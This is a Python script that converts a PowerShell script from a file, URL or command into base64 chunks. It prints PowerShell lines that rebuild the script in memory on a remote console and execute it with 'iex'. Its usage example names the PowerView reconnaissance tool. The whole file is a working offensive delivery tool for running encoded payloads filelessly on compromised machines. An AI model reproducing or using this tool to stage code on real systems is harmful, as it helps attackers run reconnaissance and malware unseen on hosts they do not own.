#!/bin/env python

import requests
import sys
import base64

if len(sys.argv) < 2:
	print("")
	print("Build PS1 scripts in memory using Base64 chunks and copy-paste")
	print("")
	print("Usage:")
	print("   %s -url URL\tLoad ps1 from url" % sys.argv[0])
	print("  OR")
	print("   %s -file FILE\tLoad ps1 from file" % sys.argv[0])
	print("  OR")
	print("   %s -cmd \"CMD\"\tEncode a single command" % sys.argv[0])
	print("")
	print("Full Example:")
	print("  (local)  python .\\b64xFunc.py -file PowerView.ps1 | clip")
	print("  (remote) [Ctrl-V] [Enter]")
	print("")
	exit()

if sys.argv[1] == '-url':
	# print("[*] Downloading: %s" % sys.argv[1])
	r = requests.get(sys.argv[2])
	if r.status_code != 200:
		print("[!] Download failed")
		exit()
	ps1 = r.text
elif sys.argv[1] == '-file':
	# print("[*] Loading file: %s" % sys.argv[1])
	ps1 = open(sys.argv[2]).read()
elif sys.argv[1] == '-cmd':
	ps1 = sys.argv[2]
else:
	print("[!] Unknown parameter")
	exit()

output = ''

print("$tmpMemChunk = '';")

for line in ps1.splitlines():

	if line.strip() == '':
		continue

	output += line + "\n"

	if len(output) > 5000:
		# print Powershell compatible base64 string
		encodedOutput = base64.b64encode(bytes(output, 'utf-8')).decode()
		print("$tmpMemChunk += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"%s\")));" % encodedOutput)
		output = ''

# Any remaining output?
if output != '':
	# print Powershell compatible base64 string
	encodedOutput = base64.b64encode(bytes(output, 'utf-8')).decode()
	print("$tmpMemChunk += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"%s\")));" % encodedOutput)
	output = ''

# final command to execute payload
print("iex $tmpMemChunk;")
print("# Press enter to execute")
